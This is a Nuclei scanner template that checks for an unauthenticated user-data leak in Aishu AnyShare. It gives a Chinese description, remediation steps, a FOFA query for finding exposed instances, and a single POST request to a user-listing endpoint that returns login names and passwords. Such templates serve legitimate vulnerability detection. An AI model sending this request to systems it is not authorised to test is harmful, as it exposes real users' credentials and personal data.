id: aishu-anyshare-info-exposure

info:
  name: Aishu AnyShare - 信息泄露漏洞
  author: s4e-io
  severity: high
  description: Aishu AnyShare - 信息泄露 存在未授权访问漏洞。未授权访问者可获取配置、凭证、用户数据或系统元信息，从而为后续攻击提供情报支持。
  remediation: |
    - 为敏感接口补充鉴权与最小化返回策略，避免未授权用户获取配置、账户或节点信息。
    - 审核日志、错误页和调试接口的输出内容，关闭不必要的调试或管理入口。
  reference:
    - https://cn-sec.com/archives/3431184.html
  metadata:
    verified: true
    max-request: 1
    vendor: aishu
    product: anyshare
    fofa-query: app="AISHU-AnyShare"
  tags: aishu-anyshare,info-leak,disclosure,vuln

http:
  - raw:
      - |
        POST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1
        Host: {{Hostname}}

        [1,100]

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "directDeptInfo\":", "loginName\":", "password\":", "createTime\":")'
          - 'contains(content_type, "application/json")'
          - 'status_code == 200'
        condition: and
